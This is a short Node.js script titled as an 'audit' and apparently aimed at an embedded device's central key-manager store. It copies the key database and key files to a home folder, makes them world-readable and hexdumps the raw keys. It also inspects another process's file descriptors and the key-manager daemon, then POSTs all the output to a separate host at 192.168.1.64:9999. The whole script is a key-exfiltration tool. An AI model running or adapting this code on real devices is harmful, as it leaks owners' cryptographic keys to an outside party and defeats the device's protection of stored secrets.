"use strict";
// audit96.js - copy CKM store files to a readable location + hexdump key structure.
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();

// copy CKM files to world-readable location
out.cp = sh("cp -f /opt/data/ckm/db-0 /opt/data/ckm/db-key-0 /opt/data/ckm/key-0 /opt/usr/home/owner/ 2>&1; chmod 644 /opt/usr/home/owner/db-0 /opt/usr/home/owner/db-key-0 /opt/usr/home/owner/key-0 2>&1; ls -la /opt/usr/home/owner/db-0 /opt/usr/home/owner/db-key-0 /opt/usr/home/owner/key-0 2>&1", 2000);

// full hexdump of the two small keys (116 bytes each)
out.dbkey_hex = sh("od -A x -t x1z /opt/data/ckm/db-key-0 2>&1", 2500);
out.key_hex = sh("od -A x -t x1z /opt/data/ckm/key-0 2>&1", 2500);

// peek at start of db-0 to confirm it's encrypted
out.db0_head = sh("od -A x -t x1z /opt/data/ckm/db-0 2>&1 | head -20", 3000);

// entropy check: count unique bytes in db-0 first 4k
out.db0_entropy = sh("head -c 4096 /opt/data/ckm/db-0 | od -A n -t x1 | tr ' ' '\\n' | grep -v '^$' | sort -u | wc -l", 300);

// check acr's open files (does it have the key file open?)
out.acr_fds = sh("ls -la /proc/3667/fd 2>&1 | head -40", 3500);

// check key-manager daemon
out.km = sh("ps 2>/dev/null | grep -i key-manager | grep -v grep; ls -la /proc/$(pidof key-manager 2>/dev/null | awk '{print $1}')/fd 2>/dev/null | head -20", 3000);

post("/p96_ckm", out);
post("/p96_done", { started: out.started });
